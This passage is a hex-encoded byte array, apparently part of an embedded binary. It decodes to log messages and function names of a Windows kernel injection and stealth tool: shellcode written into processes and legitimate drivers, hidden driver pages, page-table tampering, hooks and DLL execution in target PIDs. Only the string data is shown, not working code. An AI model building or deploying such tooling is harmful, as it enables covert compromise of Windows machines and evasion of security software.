    0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x67, 0x65, 0x74, 0x20, 0x74, 0x61,
    0x72, 0x67, 0x65, 0x74, 0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0x5B, 0x3D, 0x5D,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20,
    0x74, 0x6F, 0x20, 0x6C, 0x6F, 0x6F, 0x6B, 0x75, 0x70, 0x20, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74,
    0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x77,
    0x72, 0x69, 0x74, 0x65, 0x20, 0x73, 0x68, 0x65, 0x6C, 0x6C, 0x63, 0x6F, 0x64, 0x65, 0x20, 0x74,
    0x6F, 0x20, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73,
    0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x50, 0x73, 0x70,
    0x45, 0x78, 0x69, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x63, 0x61, 0x6C, 0x6C, 0x65,
    0x64, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65,
    0x20, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x2C, 0x20, 0x72, 0x65, 0x73, 0x74, 0x6F, 0x72, 0x69,
    0x6E, 0x67, 0x20, 0x6F, 0x72, 0x69, 0x67, 0x69, 0x6E, 0x61, 0x6C, 0x20, 0x70, 0x72, 0x6F, 0x63,
    0x65, 0x73, 0x73, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x69, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x75, 0x6E, 0x6C, 0x6F, 0x61, 0x64, 0x20, 0x72,
    0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x20, 0x70, 0x61, 0x72, 0x61, 0x6D, 0x65, 0x74, 0x65, 0x72,
    0x73, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x69, 0x6E,
    0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x70, 0x61, 0x72, 0x61, 0x6D, 0x65, 0x74, 0x65, 0x72, 0x73,
    0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x73, 0x6B, 0x69,
    0x70, 0x70, 0x65, 0x64, 0x20, 0x69, 0x73, 0x5F, 0x70, 0x66, 0x6E, 0x5F, 0x76, 0x61, 0x6C, 0x69,
    0x64, 0x20, 0x63, 0x68, 0x65, 0x63, 0x6B, 0x20, 0x6F, 0x6E, 0x20, 0x50, 0x46, 0x4E, 0x20, 0x30,
    0x78, 0x25, 0x6C, 0x6C, 0x78, 0x20, 0x64, 0x75, 0x65, 0x20, 0x74, 0x6F, 0x20, 0x65, 0x78, 0x70,
    0x65, 0x72, 0x69, 0x6D, 0x65, 0x6E, 0x74, 0x61, 0x6C, 0x5F, 0x6F, 0x70, 0x74, 0x69, 0x6F, 0x6E,
    0x73, 0x00, 0x66, 0x69, 0x6E, 0x64, 0x5F, 0x6C, 0x65, 0x67, 0x69, 0x74, 0x69, 0x6D, 0x61, 0x74,
    0x65, 0x5F, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x5F, 0x66, 0x6F, 0x72, 0x5F, 0x63, 0x61, 0x6C,
    0x6C, 0x62, 0x61, 0x63, 0x6B, 0x73, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x6E, 0x6F, 0x20, 0x73, 0x75, 0x69, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x20, 0x64,
    0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x20, 0x66, 0x6F, 0x72, 0x20,
    0x63, 0x61, 0x6C, 0x6C, 0x62, 0x61, 0x63, 0x6B, 0x73, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x68, 0x6F, 0x6F, 0x6B, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x20,
    0x63, 0x61, 0x6C, 0x63, 0x75, 0x6C, 0x61, 0x74, 0x65, 0x64, 0x3A, 0x20, 0x25, 0x7A, 0x75, 0x20,
    0x62, 0x79, 0x74, 0x65, 0x73, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x72, 0x65, 0x61, 0x64,
    0x20, 0x6F, 0x72, 0x69, 0x67, 0x69, 0x6E, 0x61, 0x6C, 0x20, 0x62, 0x79, 0x74, 0x65, 0x73, 0x00,
    0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C,
    0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x77, 0x72, 0x69, 0x74, 0x65, 0x20, 0x68, 0x6F, 0x6F, 0x6B,
    0x20, 0x62, 0x79, 0x74, 0x65, 0x73, 0x00, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x5F,
    0x62, 0x65, 0x74, 0x77, 0x65, 0x65, 0x6E, 0x5F, 0x6D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x73, 0x00,
    0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x63, 0x6F, 0x75, 0x6C,
    0x64, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x66, 0x69, 0x6E, 0x64, 0x20, 0x73, 0x75, 0x69, 0x74, 0x61,
    0x62, 0x6C, 0x65, 0x20, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20, 0x62, 0x65, 0x74, 0x77, 0x65, 0x65,
    0x6E, 0x20, 0x6D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x73, 0x20, 0x61, 0x66, 0x74, 0x65, 0x72, 0x20,
    0x63, 0x68, 0x65, 0x63, 0x6B, 0x69, 0x6E, 0x67, 0x20, 0x25, 0x64, 0x20, 0x6D, 0x6F, 0x64, 0x75,
    0x6C, 0x65, 0x73, 0x00, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x5F, 0x6E, 0x74, 0x6F, 0x73, 0x6B,
    0x72, 0x6E, 0x6C, 0x5F, 0x70, 0x61, 0x67, 0x65, 0x5F, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x73, 0x00,
    0x77, 0x72, 0x69, 0x74, 0x65, 0x5F, 0x70, 0x61, 0x67, 0x65, 0x5F, 0x74, 0x61, 0x62, 0x6C, 0x65,
    0x73, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61,
    0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x77, 0x72, 0x69, 0x74, 0x65, 0x20, 0x70, 0x61,
    0x67, 0x65, 0x20, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x73, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20,
    0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x74, 0x61, 0x62, 0x6C,
    0x65, 0x73, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66,
    0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x66, 0x69, 0x6E, 0x64, 0x20, 0x65, 0x78,
    0x70, 0x6F, 0x72, 0x74, 0x20, 0x4B, 0x65, 0x49, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x61, 0x74,
    0x65, 0x41, 0x6C, 0x6C, 0x43, 0x61, 0x63, 0x68, 0x65, 0x73, 0x00, 0x69, 0x6E, 0x69, 0x74, 0x69,
    0x61, 0x6C, 0x69, 0x7A, 0x65, 0x5F, 0x70, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x5F, 0x6D,
    0x65, 0x6D, 0x6F, 0x72, 0x79, 0x5F, 0x72, 0x61, 0x6E, 0x67, 0x65, 0x73, 0x00, 0x5B, 0x3D, 0x5D,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20,
    0x74, 0x6F, 0x20, 0x69, 0x6E, 0x69, 0x74, 0x20, 0x70, 0x68, 0x79, 0x73, 0x20, 0x6D, 0x65, 0x6D,
    0x6F, 0x72, 0x79, 0x20, 0x72, 0x61, 0x6E, 0x67, 0x65, 0x73, 0x00, 0x61, 0x6C, 0x6C, 0x6F, 0x63,
    0x61, 0x74, 0x65, 0x5F, 0x69, 0x6E, 0x64, 0x65, 0x70, 0x65, 0x6E, 0x64, 0x65, 0x6E, 0x74, 0x5F,
    0x70, 0x61, 0x67, 0x65, 0x73, 0x00, 0x68, 0x69, 0x64, 0x65, 0x5F, 0x64, 0x72, 0x69, 0x76, 0x65,
    0x72, 0x5F, 0x70, 0x61, 0x67, 0x65, 0x73, 0x00, 0x63, 0x6F, 0x70, 0x79, 0x5F, 0x6E, 0x74, 0x6F,
    0x73, 0x6B, 0x72, 0x6E, 0x6C, 0x5F, 0x70, 0x61, 0x67, 0x65, 0x73, 0x00, 0x6D, 0x61, 0x70, 0x5F,
    0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72, 0x6E, 0x6C, 0x5F, 0x70, 0x61, 0x67, 0x65, 0x73, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x63, 0x6F, 0x70, 0x69, 0x65,
    0x64, 0x20, 0x61, 0x6C, 0x6C, 0x20, 0x25, 0x7A, 0x75, 0x20, 0x70, 0x61, 0x67, 0x65, 0x73, 0x00,
    0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x73, 0x65, 0x6C, 0x65,
    0x63, 0x74, 0x65, 0x64, 0x20, 0x62, 0x61, 0x73, 0x65, 0x20, 0x61, 0x64, 0x64, 0x72, 0x65, 0x73,
    0x73, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x25, 0x73,
    0x20, 0x70, 0x61, 0x67, 0x65, 0x73, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x63, 0x6F, 0x70,
    0x79, 0x20, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72, 0x6E, 0x6C, 0x20, 0x70, 0x61, 0x67, 0x65, 0x73,
    0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69,
    0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x6D, 0x61, 0x70, 0x20, 0x6E, 0x74, 0x6F, 0x73, 0x6B,
    0x72, 0x6E, 0x6C, 0x20, 0x70, 0x61, 0x67, 0x65, 0x73, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x6D, 0x61, 0x70, 0x70, 0x65, 0x64, 0x20, 0x61, 0x6C, 0x6C,
    0x20, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72, 0x6E, 0x6C, 0x20, 0x70, 0x61, 0x67, 0x65, 0x73, 0x00,
    0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x63, 0x6F, 0x70, 0x79,
    0x69, 0x6E, 0x67, 0x20, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72, 0x6E, 0x6C, 0x20, 0x61, 0x73, 0x20,
    0x34, 0x4B, 0x42, 0x20, 0x70, 0x61, 0x67, 0x65, 0x73, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x65, 0x78, 0x65,
    0x63, 0x75, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x74, 0x69, 0x6D, 0x65, 0x64, 0x20, 0x6F, 0x75, 0x74,
    0x20, 0x61, 0x66, 0x74, 0x65, 0x72, 0x20, 0x31, 0x35, 0x20, 0x73, 0x65, 0x63, 0x6F, 0x6E, 0x64,
    0x73, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61,
    0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x6D, 0x6F, 0x64, 0x69, 0x66, 0x79, 0x20, 0x61,
    0x6E, 0x79, 0x20, 0x50, 0x54, 0x45, 0x73, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x73, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x66, 0x75, 0x6C, 0x6C, 0x79,
    0x20, 0x6D, 0x6F, 0x64, 0x69, 0x66, 0x69, 0x65, 0x64, 0x20, 0x50, 0x54, 0x45, 0x73, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x6C,
    0x65, 0x74, 0x65, 0x64, 0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x20,
    0x63, 0x72, 0x65, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x25, 0x7A, 0x75,
    0x20, 0x70, 0x61, 0x67, 0x65, 0x73, 0x20, 0x6F, 0x66, 0x20, 0x74, 0x79, 0x70, 0x65, 0x20, 0x25,
    0x73, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x70, 0x72,
    0x6F, 0x63, 0x65, 0x73, 0x73, 0x20, 0x63, 0x61, 0x6C, 0x6C, 0x62, 0x61, 0x63, 0x6B, 0x20, 0x73,
    0x68, 0x65, 0x6C, 0x6C, 0x63, 0x6F, 0x64, 0x65, 0x20, 0x77, 0x72, 0x69, 0x74, 0x74, 0x65, 0x6E,
    0x20, 0x61, 0x74, 0x20, 0x61, 0x64, 0x64, 0x72, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x70, 0x20, 0x69,
    0x6E, 0x20, 0x6C, 0x65, 0x67, 0x69, 0x74, 0x69, 0x6D, 0x61, 0x74, 0x65, 0x20, 0x64, 0x72, 0x69,
    0x76, 0x65, 0x72, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x66, 0x69, 0x6E, 0x64, 0x20, 0x75,
    0x6E, 0x75, 0x73, 0x65, 0x64, 0x20, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20, 0x66, 0x6F, 0x72, 0x20,
    0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x20, 0x63, 0x61, 0x6C, 0x6C, 0x62, 0x61, 0x63, 0x6B,
    0x20, 0x73, 0x68, 0x65, 0x6C, 0x6C, 0x63, 0x6F, 0x64, 0x65, 0x20, 0x69, 0x6E, 0x20, 0x6C, 0x65,
    0x67, 0x69, 0x74, 0x69, 0x6D, 0x61, 0x74, 0x65, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x00,
    0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x68, 0x79, 0x70, 0x65,
    0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x69, 0x6F,
    0x6E, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x2C, 0x20, 0x63, 0x6C, 0x65, 0x61, 0x6E, 0x69,
    0x6E, 0x67, 0x20, 0x75, 0x70, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x61, 0x63, 0x71, 0x75,
    0x69, 0x72, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x64, 0x6F, 0x77, 0x6E, 0x20, 0x70, 0x72, 0x6F, 0x74,
    0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x70, 0x72, 0x6F, 0x63, 0x65,
    0x73, 0x73, 0x20, 0x30, 0x78, 0x25, 0x70, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x67, 0x65,
    0x74, 0x20, 0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6F, 0x72, 0x79, 0x20, 0x62, 0x61, 0x73, 0x65,
    0x20, 0x66, 0x6F, 0x72, 0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x20, 0x30, 0x78, 0x25,
    0x70, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x68, 0x79,
    0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74,
    0x69, 0x6F, 0x6E, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x6C, 0x65, 0x74, 0x65, 0x64, 0x20, 0x61, 0x74,
    0x20, 0x61, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x70, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x44, 0x4C, 0x4C, 0x20, 0x65,
    0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x6C, 0x65, 0x74,
    0x65, 0x64, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x50, 0x49, 0x44, 0x3A, 0x20, 0x25, 0x64, 0x20, 0x61,
    0x74, 0x20, 0x61, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x70, 0x00,
    0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x63, 0x68, 0x6F, 0x73,
    0x65, 0x6E, 0x20, 0x73, 0x74, 0x61, 0x72, 0x74, 0x69, 0x6E, 0x67, 0x20, 0x61, 0x64, 0x64, 0x72,
    0x65, 0x73, 0x73, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x70, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x72, 0x20, 0x6A, 0x75, 0x6D, 0x70, 0x20, 0x73,
    0x68, 0x65, 0x6C, 0x6C, 0x63, 0x6F, 0x64, 0x65, 0x20, 0x77, 0x72, 0x69, 0x74, 0x74, 0x65, 0x6E,
    0x20, 0x61, 0x74, 0x20, 0x61, 0x64, 0x64, 0x72, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x70, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x6B, 0x65, 0x72, 0x6E, 0x65,
    0x6C, 0x5F, 0x6F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x5F, 0x72, 0x65, 0x66, 0x3C, 0x25, 0x73, 0x3E,
    0x20, 0x72, 0x65, 0x6C, 0x65, 0x61, 0x73, 0x69, 0x6E, 0x67, 0x20, 0x6F, 0x77, 0x6E, 0x65, 0x72,
    0x73, 0x68, 0x69, 0x70, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x70, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x6B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x5F, 0x68, 0x61,
    0x6E, 0x64, 0x6C, 0x65, 0x20, 0x63, 0x6C, 0x6F, 0x73, 0x69, 0x6E, 0x67, 0x3A, 0x20, 0x30, 0x78,
    0x25, 0x70, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x6B,
    0x65, 0x72, 0x6E, 0x65, 0x6C, 0x5F, 0x6F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x5F, 0x72, 0x65, 0x66,
    0x3C, 0x25, 0x73, 0x3E, 0x20, 0x64, 0x65, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6E, 0x63, 0x69,
    0x6E, 0x67, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x70, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x6B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x5F, 0x6F, 0x62, 0x6A, 0x65,
    0x63, 0x74, 0x5F, 0x72, 0x65, 0x66, 0x3C, 0x25, 0x73, 0x3E, 0x20, 0x61, 0x63, 0x71, 0x75, 0x69,
    0x72, 0x65, 0x64, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x70, 0x00, 0x6E, 0x6F, 0x00, 0x66, 0x69, 0x6E,
    0x64, 0x5F, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72, 0x6E, 0x6C, 0x5F, 0x69, 0x6E, 0x66, 0x6F, 0x00,
    0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x69, 0x6E, 0x76, 0x61,
    0x6C, 0x69, 0x64, 0x20, 0x70, 0x61, 0x72, 0x61, 0x6D, 0x65, 0x74, 0x65, 0x72, 0x73, 0x20, 0x66,
    0x6F, 0x72, 0x20, 0x44, 0x4C, 0x4C, 0x20, 0x65, 0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6F, 0x6E,
    0x00, 0x6D, 0x61, 0x6E, 0x69, 0x70, 0x75, 0x6C, 0x61, 0x74, 0x65, 0x5F, 0x73, 0x79, 0x73, 0x74,
    0x65, 0x6D, 0x5F, 0x70, 0x61, 0x72, 0x74, 0x69, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x61, 0x63, 0x71,
    0x75, 0x69, 0x72, 0x65, 0x5F, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x5F, 0x72, 0x75, 0x6E,
    0x64, 0x6F, 0x77, 0x6E, 0x5F, 0x70, 0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00,
    0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x70, 0x72, 0x6F, 0x63,
    0x65, 0x73, 0x73, 0x20, 0x25, 0x75, 0x20, 0x69, 0x73, 0x20, 0x6E, 0x75, 0x6C, 0x6C, 0x20, 0x66,
    0x6F, 0x72, 0x20, 0x72, 0x75, 0x6E, 0x64, 0x6F, 0x77, 0x6E, 0x20, 0x70, 0x72, 0x6F, 0x74, 0x65,
    0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x20, 0x25, 0x75, 0x20, 0x65, 0x78, 0x69,
    0x74, 0x65, 0x64, 0x20, 0x61, 0x66, 0x74, 0x65, 0x72, 0x20, 0x61, 0x63, 0x71, 0x75, 0x69, 0x72,
    0x69, 0x6E, 0x67, 0x20, 0x72, 0x75, 0x6E, 0x64, 0x6F, 0x77, 0x6E, 0x20, 0x70, 0x72, 0x6F, 0x74,
    0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x73, 0x65, 0x61, 0x72, 0x63, 0x68, 0x69, 0x6E, 0x67, 0x20, 0x66, 0x6F, 0x72,
    0x20, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20, 0x6F, 0x66, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x20, 0x30,
    0x78, 0x25, 0x6C, 0x6C, 0x78, 0x20, 0x28, 0x25, 0x64, 0x20, 0x70, 0x61, 0x67, 0x65, 0x73, 0x29,
    0x20, 0x77, 0x69, 0x74, 0x68, 0x69, 0x6E, 0x20, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x20, 0x73, 0x65,
    0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x63, 0x6F, 0x75, 0x6C, 0x64, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x66, 0x69, 0x6E, 0x64,
    0x20, 0x73, 0x75, 0x69, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x20, 0x65, 0x6D, 0x70, 0x74, 0x79, 0x2F,
    0x6E, 0x75, 0x6C, 0x6C, 0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x72, 0x61, 0x6E, 0x67, 0x65, 0x20,
    0x69, 0x6E, 0x20, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x20, 0x73, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E,
    0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x72, 0x65, 0x67,
    0x69, 0x73, 0x74, 0x65, 0x72, 0x65, 0x64, 0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x20,
    0x63, 0x61, 0x6C, 0x6C, 0x62, 0x61, 0x63, 0x6B, 0x20, 0x66, 0x72, 0x6F, 0x6D, 0x20, 0x6C, 0x65,
    0x67, 0x69, 0x74, 0x69, 0x6D, 0x61, 0x74, 0x65, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20,
    0x73, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x66, 0x69,
    0x6E, 0x64, 0x20, 0x75, 0x6E, 0x75, 0x73, 0x65, 0x64, 0x20, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20,
    0x69, 0x6E, 0x20, 0x2E, 0x64, 0x61, 0x74, 0x61, 0x20, 0x73, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E,
    0x00, 0x68, 0x69, 0x6A, 0x61, 0x63, 0x6B, 0x5F, 0x6E, 0x75, 0x6C, 0x6C, 0x5F, 0x70, 0x66, 0x6E,
